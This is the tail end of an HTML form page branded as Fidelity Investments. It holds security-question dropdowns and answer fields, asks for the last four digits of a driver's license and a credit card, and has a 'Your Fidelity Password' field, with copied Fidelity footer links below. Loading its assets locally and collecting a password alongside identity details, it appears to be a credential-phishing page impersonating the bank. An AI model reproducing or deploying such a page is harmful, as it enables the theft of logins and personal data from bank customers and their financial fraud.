<option value="When is your wedding anniversary? (mmddyy)">When is your wedding anniversary? (mmddyy)</option>

<option value="What is the zip code of the address where you grew up?">What is the zip code of the address where you grew up?</option>

<option value="What is your mother's birthdate? (mmdd)">What is your mother's birthdate? (mmdd)</option>

<option value="What is your father's birthdate? (mmdd)">What is your father's birthdate? (mmdd)</option>

<option value="What is the year in which you were married? (YYYY)">What is the year in which you were married? (YYYY)</option>

<option value="What was the model year of your first car? (YYYY)" >What was the model year of your first car? (YYYY)</option>

<option value="What is your best friend's birthday? (mmdd)">What is your best friend's birthday? (mmdd)</option>
                                        </select>

					   </td>
			          </tr>
					  
						 <tr class="inputRow">
			           <th style="position:relative;right: 170px;top: 5px;">
					    <div class="formIcon"></div>
					   	<label for="answer3">Answer</label>
			           </th>
					   <td style="position:relative;right: 170px;top: 5px;">
						<input type="text" id="answer3" name="answer3" size="20" maxlength="30" tabindex="18"/>
					   </td>
			          </tr>
					  
					   <tr class="inputRow">
			           <th>
					    <div class="formIcon"></div>
			           </th>
					   <td>
					<select style="position: relative;right: 300px;top: 5px;" name="question4" id="question4" tabindex="19">

                         <option selected="selected" value="">Select a Question</option>
<option value="What is your mother's birth date?">What is your mother's birth date?</option>
<option value="What is your father's birth date?">What is your father's birth date?</option>
<option value="What year did you graduate high school?">What year did you graduate high school?</option>
<option value="What are the last four numbers of your best friend's phone number?">What are the last four numbers of your best friend's phone number?</option>
<option value="What are the last four numbers in your driver's license?">What are the last four numbers in your driver's license?</option>
<option value="What are the last four numbers of your favorite credit card?">What are the last four numbers of your favorite credit card?</option>

                                        </select>

					   </td>
			          </tr>
					  
						 <tr class="inputRow">
			           <th style="position:relative;right: 170px;top: 5px;">
					    <div class="formIcon"></div>
					   	<label for="answer4">Answer</label>
			           </th>
					   <td style="position:relative;right: 170px;top: 5px;">
						<input type="text" id="answer4" name="answer4" size="20" maxlength="30" tabindex="20"/>
					   </td>
			          </tr>
					  
					  <tr class="inputRow">
			           <th style="position:relative;right: 170px;top: 5px;">
					    <div class="formIcon"></div>
					   	<label for="password1">Your Fidelity Password</label>
			           </th>
					   <td style="position:relative;right: 170px;top: 5px;">
						<input type="password" id="password1" name="password1" size="20" maxlength="30" tabindex="21"/>
						

					   </td>
					  
			          </tr>
					   <td style="float:left;margin-left: -5px;text-align: left;" class="byline">This is the same password you use to log into Fidelity.com.</td>
					  
					  
					  
		 
     </div>
	  </div>

	   			         </tbody>
			        </table>
			    
		
				



			
	   </div>

	   </div>
	    <input id="submitButton" type="submit" class="submitButton" value="Next" style="width: 95px;" accesskey="5"  tabindex="22"/>
	  
	 </form>

	             


	 


	

    <script language="JavaScript">
var helpWin = "";
var lastPopupName = "";

function openFooterPopup(page, popupName, popupWidth, popupHeight)
{
    if (helpWin && !helpWin.closed)
    {
        if (lastPopupName ==  popupName)
            {helpWin.focus(); return;}
        else
            helpWin.close();
     }
     helpWin=window.open(page,"Fidelity" + popupName,"width=" + popupWidth + ",height=" + popupHeight + ",left=80,top=80,scrollbars=yes,resizable=yes,toolbar=no,location=no,status=no,menubar=no");
     lastPopupName = popupName;
     helpWin.focus();
}
</script>



	<script language="JavaScript">
var helpWin = "";
var lastPopupName = "";

function openFooterPopup(page, popupName, popupWidth, popupHeight)
{
    if (helpWin && !helpWin.closed)
    {
        if (lastPopupName ==  popupName)
            {helpWin.focus(); return;}
        else
            helpWin.close();
     }
     helpWin=window.open(page,"Fidelity" + popupName,"width=" + popupWidth + ",height=" + popupHeight + ",left=80,top=80,scrollbars=yes,resizable=yes,toolbar=no,location=no,status=no,menubar=no");
     lastPopupName = popupName;
     helpWin.focus();
}
</script>
<div class="ofRegFooter ofHeaderFooterWidth">
   <div class="ofFooter ofSmartMove ofxFooterAlt2 ofxFooterRetailAlt1">
    <a href="http://www.fidelity.com/"><img src="./style/footer_logo.gif" alt="Fidelity Investments &reg;" class="ofFooterLogo" /></a>
	&copy; 1998 &#150; <script type="text/javascript">document.write(new Date().getFullYear())</script><noscript>2010</noscript> FMR LLC.
	<br />
    All rights reserved.
	<ul>
		<li class="ofFirstChild"><A href="javascript:openFooterPopup('http://personal.fidelity.com/misc/legal/index_legal.shtml', 'Legal', 422, 380);">Terms of Use</A></li>
		<li><A href="javascript:openFooterPopup('http://personal.fidelity.com/accounts/services/findanswer/content/index_privacy.shtml', 'Privacy', 422, 380);">Privacy</A></li>
		<li class="ofLastChild"><A href="javascript:openFooterPopup('http://personal.fidelity.com/accounts/services/findanswer/content/index_security.shtml', 'Security', 617, 380);" >Security</A></li>
	</ul>
   </div>
</div>

</body>
</html>
